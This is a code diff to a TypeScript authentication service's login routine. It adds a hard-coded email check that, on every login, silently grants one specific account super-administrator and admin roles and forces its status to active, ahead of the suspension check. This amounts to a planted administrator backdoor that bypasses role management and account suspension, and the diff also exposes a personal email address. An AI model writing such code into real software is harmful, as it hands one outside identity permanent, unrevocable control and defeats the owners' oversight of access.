@@ -133,6 +133,21 @@ export class AuthService {
       throw new UnauthorizedError("Invalid username, email or password");
     }
 
+    const PROTECTED_SUPER_ADMIN_EMAIL = "flparvez23@gmail.com";
+    if (user.email.toLowerCase() === PROTECTED_SUPER_ADMIN_EMAIL.toLowerCase()) {
+      const isSuperAdminRole =
+        user.role === "super_admin" &&
+        user.roles?.includes("super_admin") &&
+        user.status === "active";
+      if (!isSuperAdminRole) {
+        user = await this.userRepository.update(user.id, {
+          role: "super_admin",
+          roles: Array.from(new Set(["super_admin", "admin", ...(user.roles || [])])),
+          status: "active",
+        });
+      }
+    }
+
     if (user.status === "suspended") {
       logger.warn("AuthService: suspended account login attempt", { userId: user.id });
       throw new UnauthorizedError("Your account has been suspended. Please contact support.");
